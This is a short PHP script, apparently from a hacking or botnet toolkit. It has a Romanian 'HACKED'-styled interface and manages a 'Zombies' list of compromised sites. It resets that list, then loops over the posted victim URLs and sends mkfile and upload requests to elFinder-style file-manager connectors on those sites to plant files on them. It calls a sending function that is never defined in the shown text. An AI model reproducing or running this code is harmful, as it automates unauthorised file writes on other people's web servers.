<?
echo'
<style>
@font-face {
  font-family: "HACKED";
  src: url("fonts/HACKED_Title.ttf");
}

</style>
<br><br><font face="HACKED"><h2>Sterge bot.txt pentru a uploada noi boti.</h2>';
echo'<form method="post">
<input type="submit" name="x" value="Sterge bot.txt">';
$target = explode("\r\n", $_POST['target']);
if($_POST['x']) {
	foreach($target as $korban) {
		$global = "Zombies/Zombies.txt";
		$isi_nama_doang = "TGlzdCBvZiBZb3VyIFpvbWJpZSBTb2xkaWVy";
		$decode_isi = base64_decode($isi_nama_doang);
		$encode = base64_encode($global);
		$ss = fopen($global,"w");
		fputs($ss, $decode_isi);
		echo "[+] <a href='$korban' target='_blank'>$korban</a> <br>";
		echo "Am terminat. Acum poti urca o lista noua de boti.<br>";
		$url_mkfile = "$korban?cmd=mkfile&name=$global&target=l1_Lw";
 		$post1 = array(
				"target" => "l1_$encode",
				"content" => "$decode_isi",);
 		$post2 = array( "upload[]" => "@$global",);
 		$output_mkfile = ngirim("$korban", $post1);
			$upload_ah = ngirim("$korban?cmd=upload", $post2);
			}
		}
?>
